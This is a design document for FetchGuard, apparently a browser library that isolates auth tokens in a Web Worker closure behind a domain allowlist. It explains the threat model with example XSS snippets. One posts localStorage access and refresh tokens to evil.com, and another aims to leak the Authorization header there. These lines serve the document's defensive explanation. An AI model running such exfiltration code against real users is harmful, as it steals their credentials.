# FetchGuard Design Decisions

This document explains the architectural decisions behind FetchGuard and the rationale for each choice.

## Overview

FetchGuard is a **secure API proxy** that isolates authentication tokens from the main thread using Web Workers. It is NOT an API client (like axios) or a business SDK - it's a transport and security gateway.

---

## Why Web Worker?

### Problem: XSS Token Theft

In traditional SPAs, tokens stored in:
- `localStorage` - Accessible via `window.localStorage`
- `sessionStorage` - Accessible via `window.sessionStorage`
- JavaScript variables - Accessible via global scope or closures that XSS can reach

An XSS attack can:
```javascript
// Attacker's injected script
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    accessToken: localStorage.getItem('token'),
    refreshToken: localStorage.getItem('refreshToken')
  })
})
```

### Solution: Worker Memory Isolation

Web Workers run in a **separate JavaScript execution context**:

```
Main Thread                 Web Worker
┌──────────────────┐       ┌──────────────────┐
│ window           │       │ self (no window) │
│ document         │   ×   │ No DOM access    │
│ localStorage     │ ───── │ No storage APIs  │
│ XSS attack here  │       │ Tokens live here │
└──────────────────┘       └──────────────────┘
        │                          │
        └──── postMessage() ───────┘
              (data only)
```

**Key security properties:**
1. Worker has no `window`, `document`, `localStorage`, `sessionStorage`
2. XSS in main thread CANNOT access worker's JavaScript scope
3. Only `postMessage()` can communicate - and we control what's sent
4. Tokens never cross the postMessage boundary

---

## Why IIFE Closure?

Even within the Worker, we add another layer of protection using an IIFE (Immediately Invoked Function Expression):

```javascript
// worker.ts structure
;(function() {
  // Private scope - not accessible from self
  let accessToken: string | null = null
  let refreshToken: string | null = null
  let expiresAt: number | null = null

  // These variables are in closure scope
  // Even code with access to `self` cannot read them

  self.onmessage = (event) => {
    // Handle messages, use tokens internally
    // Never send tokens back in postMessage
  }
})()
```

**Why not just use `self.token`?**

```javascript
// BAD: Token on global worker scope
self.token = 'secret123'

// Attacker could potentially:
// 1. Inject code that runs before worker loads
// 2. Modify Worker prototype
// 3. Intercept postMessage and inject code
```

With IIFE closure:
- Variables are in lexical scope, not on any object
- No API exists to retrieve them
- Even `self.token` or `globalThis.token` returns undefined

---

## Why NOT Map HTTP Errors to err()?

### The Debate

Many libraries (axios, ky) throw on HTTP 4xx/5xx:
```javascript
// axios behavior
try {
  await axios.get('/users/999')  // 404
} catch (error) {
  // Thrown as exception
}
```

### Our Decision: Transport vs Business Separation

FetchGuard returns `ok()` for ALL HTTP responses:

```typescript
const result = await api.get('/users/999')

if (result.ok) {
  const envelope = result.data
  // envelope.status = 404
  // envelope.body = '{"error": "User not found"}'

  // YOU decide what's an error
  if (envelope.status === 404) {
    // Maybe this is expected (user doesn't exist yet)
    return createUser()
  }
}
```

**Rationale:**

1. **Transport succeeded** - We got an HTTP response. The network worked.

2. **Business logic varies** - Is 404 an error?
   - `GET /users/me` returning 404 = error (should be logged in)
   - `GET /users/check?email=new@test.com` returning 404 = success (email available)

3. **Full response access** - With `err()`, you lose the response body. With `ok(envelope)`, you always have:
   - Status code
   - Response body (for error details)
   - Headers

4. **Explicit handling** - Forces developers to think about HTTP status

**When DO we return err()?**
- Network failure (connection refused, DNS error)
- Request timeout
- Request cancelled
- Response parsing failure

These are TRUE transport errors - no HTTP response exists.

---

## Why Domain Allowlist?

Even with token isolation, an attacker could try:

```javascript
// XSS attack
api.fetch('https://evil.com/steal-via-auth-header')
// Token would be sent in Authorization header!
```

**Solution: Domain allowlist**

```typescript
const api = createClient({
  provider: { ... },
  allowedDomains: ['api.example.com', '*.cdn.example.com']
})

// This would be BLOCKED
api.fetch('https://evil.com/anything')
// Error: Domain not in allowlist
```

**Features:**
- Exact match: `api.example.com`
- Wildcard subdomain: `*.example.com` (matches `api.example.com`, `cdn.example.com`)
- Port matching: `localhost:3000`
- Combined: `*.example.com:8080`

---

## Why Proactive Token Refresh?

### Problem: Race Condition

```
Time: 0s     Token expires in 60s
Time: 55s    User clicks button
Time: 56s    Request starts
Time: 60s    Token expires!
Time: 61s    Request reaches server → 401
```

### Solution: Refresh Before Expiry

```typescript
const api = createClient({
  provider: { ... },
  refreshEarlyMs: 30000  // Refresh 30s before expiry
})
```

```
Time: 0s     Token expires in 60s
Time: 30s    proactiveRefresh() triggered
Time: 31s    New token obtained, expires in 60s
Time: 55s    User clicks button
Time: 56s    Request uses new valid token ✓
```

**Refresh mutex**: Only one refresh at a time, concurrent requests wait for the same refresh.

---

## Non-Goals

Things FetchGuard intentionally does NOT do:

### 1. SSR Support
Workers don't exist in Node.js (without polyfills). FetchGuard is browser-only.

**Alternative:** Use server-side token handling for SSR, FetchGuard for client-side.

### 2. Streaming Responses
`postMessage()` requires complete data. Streaming would require:
- Chunked transfer
- Complex coordination
- Memory management

**Alternative:** For streaming (AI chat, file downloads), use direct fetch with separate auth handling.

### 3. Request/Response Interception
Unlike axios interceptors, FetchGuard doesn't allow:
```typescript
// NOT SUPPORTED
api.interceptors.request.use(config => {
  config.headers['X-Custom'] = 'value'
  return config
})
```

**Reason:** Interceptors could be used to exfiltrate tokens. Debug hooks are observe-only.

### 4. Legacy Browser Support
Requires:
- Web Workers
- ES2022+ features
- `import.meta.url`

**Minimum:** Chrome 80+, Firefox 74+, Safari 14+, Edge 80+

### 5. Full Axios Compatibility
FetchGuard is not a drop-in axios replacement. Different API, different philosophy.

### 6. Request Priority Queue
Considered but rejected. Priority queue adds complexity without proportional benefit:

**Why Not:**
1. **Priority inversion risk** - High-priority requests requiring auth would wait for refresh token calls queued as normal priority
2. **Starvation risk** - Low-priority requests may never complete
3. **Wrong abstraction layer** - FetchGuard is a transport gateway; priority is application-level orchestration

**Workarounds:**
- Use separate FetchGuard instances for critical vs background requests
- Implement priority logic in your application's request manager
- Use `AbortSignal` to cancel low-priority requests when resources are needed

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                        Main Thread                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                  FetchGuardClient                    │   │
│  │  - Request queue with concurrency control           │   │
│  │  - FormData serialization                           │   │
│  │  - Debug hooks (observe-only)                       │   │
│  │  - Auth state listeners                             │   │
│  └─────────────────────────────────────────────────────┘   │
│                           │                                 │
│                    postMessage()                            │
│                    (no tokens!)                             │
│                           │                                 │
└───────────────────────────│─────────────────────────────────┘
                            │
┌───────────────────────────│─────────────────────────────────┐
│                           │         Web Worker              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │              IIFE Closure (tokens here)              │   │
│  │  ┌───────────────────────────────────────────────┐  │   │
│  │  │  accessToken    refreshToken    expiresAt     │  │   │
│  │  │  user           provider        config        │  │   │
│  │  └───────────────────────────────────────────────┘  │   │
│  │                                                      │   │
│  │  - Domain validation                                │   │
│  │  - Token injection (Authorization header)           │   │
│  │  - Proactive refresh                                │   │
│  │  - Auth API calls (login/logout/refresh)           │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Message Protocol

### Main → Worker

| Message | Purpose |
|---------|---------|
| `SETUP` | Initialize worker with config and provider |
| `FETCH` | Execute authenticated API request |
| `AUTH_CALL` | Call auth method (login/logout/refresh) |
| `CANCEL` | Abort pending request |
| `PING` | Heartbeat check |

### Worker → Main

| Message | Purpose |
|---------|---------|
| `READY` | Worker initialized successfully |
| `SETUP_ERROR` | Worker initialization failed |
| `FETCH_RESULT` | HTTP response received (any status) |
| `FETCH_ERROR` | Network/transport error |
| `AUTH_CALL_RESULT` | Auth operation completed |
| `AUTH_STATE_CHANGED` | Token state changed (broadcast) |
| `PONG` | Heartbeat response |

---

## Security Guarantees

1. **Token Isolation**: Tokens never exist in main thread memory
2. **No Token Leakage**: Tokens never appear in postMessage payloads
3. **Domain Restriction**: Tokens only sent to allowed domains
4. **Fail Closed**: On error, requests fail rather than leak tokens
5. **No eval()**: No dynamic code execution, safe provider config

---

## Trade-offs

| Decision | Benefit | Cost |
|----------|---------|------|
| Web Worker | Token isolation | Browser-only, no SSR |
| IIFE closure | Defense in depth | Slightly more complex code |
| Transport-only result | Clear semantics | More verbose error handling |
| Domain allowlist | Prevent exfiltration | Manual configuration |
| No interceptors | Security | Less flexibility |
| Proactive refresh | No 401 races | Extra refresh calls |

---

## References

- [Web Workers API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API)
- [postMessage Security](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [ts-micro-result](https://github.com/user/ts-micro-result) - Result type library
